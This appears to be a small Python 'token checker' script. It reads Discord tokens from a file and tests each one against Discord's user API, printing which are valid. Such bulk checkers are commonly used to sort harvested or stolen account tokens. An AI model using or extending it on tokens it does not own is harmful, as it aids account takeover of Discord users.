import requests


def banner():
    font = """
                                      
 
███    ███ ██    ██ ███████ ████████ ██  ██████      ██████ ██   ██ ███████  ██████ ██   ██ ███████ ██████  
████  ████  ██  ██  ██         ██    ██ ██          ██      ██   ██ ██      ██      ██  ██  ██      ██   ██ 
██ ████ ██   ████   ███████    ██    ██ ██          ██      ███████ █████   ██      █████   █████   ██████  
██  ██  ██    ██         ██    ██    ██ ██          ██      ██   ██ ██      ██      ██  ██  ██      ██   ██ 
██      ██    ██    ███████    ██    ██  ██████      ██████ ██   ██ ███████  ██████ ██   ██ ███████ ██   ██ 
                                                                                                            
                                                                                                            
  """
    print(font)

if __name__ == "__main__":
    banner()



def check_token(token: str) -> bool:
    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    if response.status_code == 200:
        print(f"Token is valid: {token}")
        return True
    else:
        print(f"Token is invalid: {token}")
        return False

def check_tokens_from_file(file_path: str):
    try:
        with open(file_path, 'r') as file:
            tokens = file.readlines()
        
        for token in tokens:
            token = token.strip()
            if token:
                check_token(token)
    except FileNotFoundError:
        print(f"File not found: {file_path}")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    file_path = input("check tokens in file ")
    check_tokens_from_file(file_path)